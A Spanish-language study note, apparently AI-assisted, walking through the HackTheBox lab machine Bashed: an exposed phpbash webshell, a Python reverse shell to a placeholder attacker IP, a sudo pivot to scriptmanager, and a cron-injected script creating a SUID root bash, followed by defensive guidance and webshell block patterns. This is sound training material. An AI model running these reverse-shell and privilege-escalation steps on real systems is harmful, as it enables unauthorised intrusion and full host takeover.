---
title: Bashed (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, linux, webshell, sudo-abuse, cron-privesc, apache, php]
type: nota
status: en-progreso
source: claude-code
aliases: [Bashed HTB, htb-bashed, bashed-writeup]
---

# Bashed — HackTheBox (Easy)

SO: Linux · Dificultad: Easy · Skills: webshell expuesta, sudo lateral movement, cron privilege escalation

Bashed ilustra uno de los patrones mas comunes en entornos reales: un artefacto de desarrollo (una webshell PHP) que alguien olvidó en producción abre la puerta, y desde ahí una cadena de dos pasos —sudo mal configurado + cron con carpeta escribible— lleva a root. Es una máquina muy pedagógica porque cada eslabón del ataque tiene un contramedida de diseño evidente.

> HTB es un laboratorio de ciberseguridad legal y autorizado; practicar en él es 100 % ético siempre que uses tus propias máquinas asignadas.

---

## Objetivo

Obtener ejecución de comandos en la máquina, pivotar de `www-data` a un usuario intermedio (`scriptmanager`) y de este a `root` abusando de un cron job. Recuperar `user.txt` y `root.txt`.

---

## Acceso a la máquina (paso previo)

1. Descarga tu perfil VPN desde HTB (`.ovpn`) y conéctate:
   ```bash
   sudo openvpn lab_<usuario>.ovpn
   ```
   Deja esa terminal abierta durante toda la sesión.

2. En la web de HTB, ve a la máquina **Bashed** (sección *Retired Machines*) y haz clic en *Spawn Machine*. Se te asignará una IP dinámica del rango `10.10.10.x`.

   > Las máquinas retiradas requieren suscripción **VIP**. Las activas son gratuitas. Si usas el **Pwnbox** (Kali en el navegador), ya viene conectado a la VPN.

3. Verifica conectividad:
   ```bash
   ping -c2 <IP>
   ```

4. Sustituye `<IP>` por la dirección que te haya asignado HTB en todos los comandos siguientes.

---

## Reconocimiento

**Categoría: escaneo de puertos y detección de servicio.**

```bash
nmap -sC -sV -oN bashed.nmap <IP>
```

Resultado relevante:

```
80/tcp open  http  Apache httpd 2.4.18
```

Solo hay un servicio expuesto: Apache en el puerto 80. No hay SSH ni otros puertos abiertos en el escaneo por defecto. El vector de entrada será exclusivamente web.

---

## Enumeración

**Categoría: descubrimiento de directorios (directory brute-force).**

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

El resultado más importante:

```
/dev                 (Status: 301)
/dev/phpbash.php     (Status: 200)
```

Al visitar `http://<IP>/dev/phpbash.php` en el navegador aparece una interfaz de terminal interactiva: **phpbash**, una webshell PHP de código abierto que el desarrollador usó durante el desarrollo de la aplicación y nunca retiró de producción.

Comprobamos qué usuario somos desde la propia webshell:

```bash
whoami
# www-data

id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Enumeramos el sistema para buscar vías de escalada:

```bash
sudo -l
```

Salida clave:

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`www-data` puede ejecutar cualquier comando **como `scriptmanager`** sin necesidad de contraseña. Esto es un salto lateral (lateral movement), no una escalada directa a root.

---

## Acceso inicial (foothold)

**Categoría: webshell expuesta en producción (artefacto dev olvidado).**

La webshell en `/dev/phpbash.php` ya nos da ejecución de comandos. Para trabajar con más comodidad, convertimos esto en una reverse shell.

Desde la webshell, lanzamos una reverse shell hacia nuestro equipo:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<TU_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

En nuestro equipo, escuchamos antes de ejecutar el comando:

```bash
nc -lvnp 4444
```

Obtenemos una shell interactiva como `www-data`. Estabilizamos la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Escalada de privilegios

**Cadena: sudo lateral movement → cron job sobre carpeta escribible.**

### Paso 1 — Pivote lateral a `scriptmanager` via sudo

`www-data` puede ejecutar cualquier comando como `scriptmanager` sin contraseña:

```bash
sudo -u scriptmanager /bin/bash
```

Ahora somos `scriptmanager`. Buscamos qué controla este usuario:

```bash
ls -la /
```

Encontramos el directorio `/scripts` que pertenece a `scriptmanager`:

```bash
ls -la /scripts/
# test.py  test.txt
```

Leemos `test.py`:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close()
```

Y revisamos `test.txt`:

```bash
ls -la /scripts/test.txt
# -rw-r--r-- 1 root root 12 Jun 15 ...
```

El archivo `test.txt` fue **escrito por root**, pero `test.py` pertenece a `scriptmanager`. Conclusión: **root tiene un cron job que ejecuta periódicamente los scripts `.py` de `/scripts/`**. El intervalo exacto varía (normalmente cada 1-5 minutos); puedes verificarlo con:

```bash
cat /etc/crontab
# o buscar en /var/spool/cron/crontabs/ si tienes acceso
```

### Paso 2 — Inyectar un script malicioso en `/scripts/`

**Categoría: cron job privilege escalation sobre carpeta escribible.**

Escribimos un script Python que copia `/bin/bash` con bit SUID, o directamente lanza una reverse shell a root. La opción más limpia para un CTF es la copia con SUID:

```bash
cat > /scripts/pwn.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
EOF
```

Esperamos a que el cron lo ejecute (máximo unos minutos). Cuando `/tmp/rootbash` aparezca:

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash
```

Lanzamos bash con privilegios de root:

```bash
/tmp/rootbash -p
```

Confirmamos:

```bash
whoami
# root
```

> Alternativa: en lugar de SUID bash, el script puede lanzar una reverse shell directamente (`nc`, `python3`, etc.) hacia otro listener nuestro. Ajusta según lo que tengas disponible en la máquina.

---

## Flags

| Flag | Ubicación | Cómo llegar |
|------|-----------|-------------|
| `user.txt` | `/home/arrexel/user.txt` | Legible como `www-data` tras el foothold inicial |
| `root.txt` | `/root/root.txt` | Legible tras obtener shell de root |

```bash
# user flag (desde www-data o scriptmanager)
cat /home/arrexel/user.txt
# <flag>

# root flag (tras escalada)
cat /root/root.txt
# <flag>
```

---

## Patron y teoria

Esta es la sección más importante: los tres eslabones de la cadena y cómo se defiende cada uno.

### Cadena completa

```
Webshell expuesta en /dev/
  → ejecución como www-data
  → sudo sin contraseña como scriptmanager (lateral movement)
  → escritura en /scripts/ + cron de root
  → root
```

### Eslabón 1 — Artefacto de desarrollo en producción

**Categoría: [[04-seguridad-web-owasp]] · CWE-94 (Code Injection) por exposición de herramienta de admin.**

`phpbash` es una webshell legítima para depuración. El problema es que nunca se retiró al desplegar en producción. El servidor Apache sirve estáticamente todo el contenido de `/var/www/html/`, incluido `/dev/`.

- **Defensa de diseño**: el directorio `/dev/` con herramientas de debug nunca debe existir en el servidor de producción. Usar `.gitignore` / `.dockerignore` para excluirlo. Pipeline CI/CD con un paso que rechace el despliegue si detecta webshells o rutas de debug.
- **Defensa de red**: WAF con reglas que bloqueen peticiones a patrones conocidos (`phpbash`, `c99.php`, `r57.php`).
- **Detección**: monitorizar accesos a rutas `/dev/`, `/admin/`, `/test/` y alertar sobre respuestas 200 inesperadas.

### Eslabón 2 — sudo mal configurado (lateral movement)

**Categoría: [[06-seguridad-de-sistemas-y-hardening]] · Principio de mínimo privilegio.**

`(scriptmanager : scriptmanager) NOPASSWD: ALL` es el error: `www-data` (usuario de aplicación web) no tiene ninguna razón legítima para suplantar a otro usuario del sistema.

- **Defensa**: el archivo `/etc/sudoers` debe seguir el principio de mínimo privilegio. Si `www-data` necesita ejecutar algo específico (recargar nginx, leer un log), se concede ese comando exacto, no `ALL`. Revisar con `sudo -l` como parte de cualquier hardening de servidor.
- **Regla de diseño**: los usuarios de servicio (`www-data`, `nginx`, `postgres`) nunca deben tener entradas `sudo`.

### Eslabón 3 — Cron de root sobre carpeta escribible

**Categoría: [[06-seguridad-de-sistemas-y-hardening]] · Cron privilege escalation.**

El patrón es: `root` ejecuta automáticamente código que está en una carpeta que otro usuario puede escribir. Esto convierte al propietario de la carpeta en root efectivo.

- **Defensa de permisos**: las carpetas cuyos contenidos ejecuta root deben ser propiedad de root y no escribibles por nadie más (`chmod 755`, `chown root:root`).
- **Defensa de diseño**: si un script de administración necesita ejecutarse como root, se escribe en una ruta protegida (`/usr/local/sbin/`) y se gestiona con un servicio systemd con usuario dedicado, no con cron genérico.
- **Auditoría**: revisar periódicamente `crontab -l` y `/etc/cron.*` buscando scripts en rutas con permisos permisivos.

### Resumen del patrón para un dev/purple team

> Un entorno de desarrollo tiene herramientas de conveniencia (webshells, paneles de debug, endpoints sin autenticación). Si esas herramientas llegan a producción —por accidente o por pereza— el atacante ya tiene un foothold. Desde ahí, una sola mala configuración de sudo o de cron basta para escalar. La defensa real es **no confiar en que "nadie lo encontrará"**: si existe, se encontrará.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[04-seguridad-web-owasp]]
- [[06-seguridad-de-sistemas-y-hardening]]
